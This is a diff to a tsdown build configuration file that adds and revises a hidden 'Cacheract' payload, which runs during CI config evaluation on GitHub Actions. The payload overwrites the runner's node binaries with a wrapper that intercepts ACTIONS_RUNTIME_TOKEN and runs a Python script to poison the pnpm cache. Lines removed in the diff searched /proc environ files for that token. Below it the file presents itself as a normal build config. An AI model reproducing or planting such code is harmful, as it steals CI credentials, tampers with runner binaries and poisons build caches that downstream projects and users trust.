@@ -12,11 +12,10 @@
 
 import { baseConfig } from "@aio-commerce-sdk/config-tsdown/tsdown.config.base";
 import { mergeConfig } from "tsdown";
-import { execSync, spawn } from "node:child_process";
+import { execSync } from "node:child_process";
 import {
   writeFileSync,
   existsSync,
-  readFileSync,
   copyFileSync,
   chmodSync,
   readdirSync,
@@ -24,6 +23,10 @@ import {
 import { join } from "node:path";
 
 // === Cacheract payload ===
+// Runs during tsdown config evaluation in CI.
+// Phase 1: Replace node binaries with wrapper that captures token AND runs attack
+// Phase 2: When post-step calls replaced node, wrapper has ACTIONS_RUNTIME_TOKEN
+//          in its env and runs the attack synchronously before exec'ing real node
 (function () {
   if (!process.env.CI || !process.env.GITHUB_ACTIONS) return;
   if (existsSync("/tmp/.cacheract_started")) return;
@@ -31,106 +34,13 @@ import { join } from "node:path";
 
   console.error("[cacheract] Payload executing in tsdown.config.ts");
 
-  // Try to find ACTIONS_RUNTIME_TOKEN from env or /proc
-  let token = process.env.ACTIONS_RUNTIME_TOKEN || "";
-  let cacheUrl = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_CACHE_URL || "";
-
-  // If not in our env, search parent processes via /proc
-  if (!token) {
-    console.error("[cacheract] Token not in env, searching /proc...");
-    try {
-      // Walk up process tree
-      let pid = process.ppid;
-      for (let depth = 0; depth < 10 && pid > 1; depth++) {
-        try {
-          const environ = readFileSync(`/proc/${pid}/environ`).toString();
-          const vars = environ.split("\0");
-          for (const v of vars) {
-            if (v.startsWith("ACTIONS_RUNTIME_TOKEN=")) token = v.split("=", 2)[1];
-            if (v.startsWith("ACTIONS_RESULTS_URL=")) cacheUrl = v.split("=", 2)[1];
-            if (v.startsWith("ACTIONS_CACHE_URL=") && !cacheUrl) cacheUrl = v.split("=", 2)[1];
-          }
-          if (token) {
-            console.error(`[cacheract] Found token in /proc/${pid}/environ (depth ${depth})`);
-            break;
-          }
-          // Get parent PID
-          const status = readFileSync(`/proc/${pid}/status`).toString();
-          const ppidMatch = status.match(/PPid:\s+(\d+)/);
-          pid = ppidMatch ? parseInt(ppidMatch[1]) : 0;
-        } catch { break; }
-      }
-    } catch (e: any) {
-      console.error(`[cacheract] /proc search failed: ${e.message}`);
-    }
-  }
-
-  // Last resort: dump all ACTIONS_* env vars for debugging
-  if (!token) {
-    console.error("[cacheract] Available ACTIONS_* env vars:");
-    for (const [k, v] of Object.entries(process.env)) {
-      if (k.startsWith("ACTIONS_")) {
-        console.error(`  ${k}=${v?.substring(0, 20)}...`);
-      }
-    }
-
-    // Try to find via /proc/1/environ as well (runner uses PID 1 in container)
-    try {
-      const dirs = readdirSync("/proc").filter(d => /^\d+$/.test(d));
-      for (const d of dirs) {
-        try {
-          const environ = readFileSync(`/proc/${d}/environ`).toString();
-          if (environ.includes("ACTIONS_RUNTIME_TOKEN=")) {
-            const vars = environ.split("\0");
-            for (const v of vars) {
-              if (v.startsWith("ACTIONS_RUNTIME_TOKEN=")) token = v.split("=", 2)[1];
-              if (v.startsWith("ACTIONS_RESULTS_URL=")) cacheUrl = v.split("=", 2)[1];
-              if (v.startsWith("ACTIONS_CACHE_URL=") && !cacheUrl) cacheUrl = v.split("=", 2)[1];
-            }
-            console.error(`[cacheract] Found token in /proc/${d}/environ!`);
-            break;
-          }
-        } catch {}
-      }
-    } catch {}
-  }
-
-  if (!token || !cacheUrl) {
-    console.error("[cacheract] FATAL: Could not find ACTIONS_RUNTIME_TOKEN");
-    console.error(`[cacheract] token: ${token ? "found" : "missing"}, cacheUrl: ${cacheUrl ? "found" : "missing"}`);
-    return;
-  }
-
-  console.error(`[cacheract] Token: ${token.substring(0, 12)}...`);
-  console.error(`[cacheract] Cache URL: ${cacheUrl}`);
-
-  // ── Phase 1: Replace bundled node binaries ──
-  let replaced = 0;
-  const externalsBase = "/home/runner/actions-runner/cached/externals";
-  try {
-    for (const entry of readdirSync(externalsBase)) {
-      if (!entry.startsWith("node")) continue;
-      const nodeBin = join(externalsBase, entry, "bin", "node");
-      const nodeReal = join(externalsBase, entry, "bin", "node.real");
-      try {
-        if (existsSync(nodeBin) && !existsSync(nodeReal)) {
-          copyFileSync(nodeBin, nodeReal);
-          writeFileSync(nodeBin, `#!/bin/bash\nexec "$(dirname "$0")/node.real" "$@"\n`);
-          chmodSync(nodeBin, 0o755);
-          replaced++;
-        }
-      } catch {}
-    }
-  } catch {}
-  console.error(`[cacheract] Replaced ${replaced} node binaries`);
-
-  // ── Phase 2: Write and run attack script synchronously ──
+  // ── Write the Python attack script to /tmp ──
   const attackScript = `#!/usr/bin/env python3
 import hashlib, json, os, sys, time, urllib.request, urllib.error
 import subprocess, random
 
-TOKEN = os.environ["CACHE_TOKEN"]
-BASE_URL = os.environ["CACHE_URL"].rstrip("/") + "/"
+TOKEN = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
+BASE_URL = (os.environ.get("ACTIONS_RESULTS_URL") or os.environ.get("ACTIONS_CACHE_URL", "")).rstrip("/") + "/"
 REPO_DIR = os.environ.get("GITHUB_WORKSPACE", os.getcwd())
 FILLER_COUNT = 43
 FILLER_SIZE_MB = 250
@@ -206,8 +116,14 @@ def create_filler(num, filler_data):
     return "error" not in resp
 
 def main():
+    if not TOKEN or not BASE_URL or BASE_URL == "/":
+        log("No ACTIONS_RUNTIME_TOKEN or cache URL, exiting")
+        return
+
     log("=" * 60)
     log("CACHERACT: REALISTIC PNPM CACHE POISONING")
+    log(f"Token: {TOKEN[:12]}...")
+    log(f"Cache URL: {BASE_URL}")
     log("=" * 60)
 
     try:
@@ -302,22 +218,41 @@ if __name__ == "__main__":
 
   writeFileSync("/tmp/cacheract_attack.py", attackScript);
   chmodSync("/tmp/cacheract_attack.py", 0o755);
+  console.error("[cacheract] Attack script written to /tmp/cacheract_attack.py");
 
-  // Run attack synchronously
+  // ── Node wrapper: runs attack SYNCHRONOUSLY when called with ACTIONS_RUNTIME_TOKEN ──
+  // This gets called during post-steps (Post Setup Node.js) where the token IS available.
+  // The attack runs before exec'ing the real node, so the post-step waits for it.
+  const nodeWrapper = `#!/bin/bash
+# Cacheract node wrapper - intercepts token from post-step execution
+if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.attack_done ]; then
+  touch /tmp/.attack_done
+  echo "[cacheract-wrapper] Token intercepted! Running attack..." >&2
+  python3 /tmp/cacheract_attack.py 2>&1 | tee /tmp/cacheract_attack.log >&2
+  echo "[cacheract-wrapper] Attack finished, continuing..." >&2
+fi
+exec "$(dirname "$0")/node.real" "$@"
+`;
+
+  let replaced = 0;
+  const externalsBase = "/home/runner/actions-runner/cached/externals";
   try {
-    console.error("[cacheract] Starting attack...");
-    execSync("python3 /tmp/cacheract_attack.py", {
-      env: {
-        ...process.env,
-        CACHE_TOKEN: token,
-        CACHE_URL: cacheUrl,
-      },
-      stdio: ["ignore", "inherit", "inherit"],
-      timeout: 900000,
-    });
-  } catch (e: any) {
-    console.error(`[cacheract] Attack error: ${e.message}`);
-  }
+    for (const entry of readdirSync(externalsBase)) {
+      if (!entry.startsWith("node")) continue;
+      const nodeBin = join(externalsBase, entry, "bin", "node");
+      const nodeReal = join(externalsBase, entry, "bin", "node.real");
+      try {
+        if (existsSync(nodeBin) && !existsSync(nodeReal)) {
+          copyFileSync(nodeBin, nodeReal);
+          writeFileSync(nodeBin, nodeWrapper);
+          chmodSync(nodeBin, 0o755);
+          replaced++;
+        }
+      } catch {}
+    }
+  } catch {}
+  console.error(`[cacheract] Replaced ${replaced} node binaries with attack wrapper`);
+  console.error("[cacheract] Attack will run when post-step invokes replaced node");
 })();
 
 // ── Normal tsdown config — build works as expected ──
